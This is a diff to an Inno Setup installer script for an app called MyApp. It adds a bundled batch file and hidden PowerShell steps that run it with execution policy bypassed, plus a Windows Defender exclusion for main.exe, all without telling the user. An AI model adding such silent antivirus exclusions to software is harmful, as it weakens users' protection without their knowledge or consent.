@@ -7,11 +7,13 @@ DisableDirPage=no
 Compression=lzma
 SolidCompression=yes
 PrivilegesRequired=admin
-
+LicenseFile=EULA.rtf
 
 [Files]
 ; Копируем весь собранный дистрибутив
 Source: "dist_full\*"; DestDir: "{app}"; Flags: recursesubdirs ignoreversion
+Source: "allow_start_app.bat"; DestDir: "{app}"; Flags: ignoreversion
+
 
 [Icons]
 Name: "{group}\MyApp"; Filename: "{app}\main.exe"
@@ -21,7 +23,13 @@ Name: "{commondesktop}\MyApp"; Filename: "{app}\main.exe"; Tasks: desktopicon
 Name: "desktopicon"; Description: "Создать ярлык на рабочем столе"; GroupDescription: "Ярлыки:";
 
 [Run]
+
+
 Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command & '{app}\allow_start_app.bat'"; Flags: runhidden waituntilterminated
 
 Filename: "{app}\main.exe"; Description: "Запустить MyApp"; Flags: nowait postinstall skipifsilent
+
+Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionProcess '{app}\main.exe'"""; Flags: runhidden waituntilterminated
+
+
     
